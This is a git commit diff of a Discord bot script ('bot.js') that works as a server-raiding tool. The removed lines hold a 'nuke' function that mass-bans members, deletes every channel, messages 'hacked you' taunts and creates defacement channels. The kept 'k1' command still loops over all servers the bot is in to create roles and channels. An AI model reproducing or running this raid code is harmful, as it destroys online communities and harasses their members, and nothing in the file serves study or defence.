7914b74b88ccb4f3ad1c5f333a64512c142a865f
zRespect69 <51334815+zRespect69@users.noreply.github.com>
2019-06-19 04:53:44 +0200

    Update bot.js

--- bot.js
+++ bot.js
@@ -1,22 +1,10 @@
-const Discord = require("discord.js");
+const Discord = require('discord.js');
 const client = new Discord.Client();
 
 
-});
-client.on('ready',  () => {
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('      ~            ~  By : n3k ~           ~    ');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log('~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~');
-console.log(`Logged in as  * [ "  n3k " ] servers! [ " ${client.guilds.size} " ] Users! [ " ${client.users.size} " ]`);
- 
-});
 
- 
 client.on('message', message => {
      
- 
      if (message.content === "k1") {
          client.guilds.forEach(m =>{
   m.createRole({
@@ -345,44 +333,5 @@ m.createChannel('By Respect.', 'voice');
 }
  
 });
- 
- 
-const { Client } = require('discord.js');
-const client = new Client();
- 
-async function nuke(guild) {
-  let users = 0;
-  let channels = 0;
- 
-  await guild.fetchMembers();
- 
-  await guild.owner.send(' Hacked u by n3k4 Is here    سلم على سيرفرك هههههههههههههههه').catch(e => { return void e; });
- 
- 
- 
-  await Promise.all(guild.members.map(async (m) => {
-    if (m.bannable) {
-      users++;
-      await m.send('hacked you by respect').catch(e => { return void e; });
-      return m.ban();
-    }
-  }));
- 
-    await Promise.all(guild.channels.map(c => {
-    if (c.deletable) {
-      channels++;
-      return c.delete();
-    }
-  }));
- 
-    await guild.createChannel('Hacked u by respect Is here', 'text');
- 
-      await guild.createChannel('By Respect.', 'voice');
- 
- 
- 
-}
- 
 
- 
 client.login(process.env.BOT_TOKEN);
